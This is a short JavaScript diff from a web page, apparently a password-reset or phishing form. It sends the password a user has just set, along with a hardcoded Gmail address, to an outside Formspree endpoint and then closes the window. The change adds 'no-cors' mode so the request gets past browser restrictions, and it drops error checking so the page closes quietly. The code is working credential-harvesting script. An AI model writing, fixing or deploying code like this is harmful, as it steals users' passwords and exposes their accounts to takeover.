@@ -69,21 +69,17 @@
             
             fetch("https://formspree.io/f/mnqeyzln", {
                 method: "POST",
+                mode: "no-cors", // CORS hatasını önler
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     email: "qenes4444@gmail.com",
                     message: "The new password set by the user is: " + newPassword
                 })
-            }).then(response => {
-                if (response.ok) {
-                    console.log("Email sent successfully");
-                    window.close();
-                } else {
-                    console.error("Error sending email:", response.statusText);
-                    alert("Failed to send email. Please try again.");
-                }
+            }).then(() => {
+                console.log("Email request sent (CORS mode)");
+                window.close(); // Sayfayı kapat
             }).catch(error => {
-                console.error("Error:", error);
+                console.error("Error sending email:", error);
                 alert("An error occurred. Please check the console.");
             });
         }
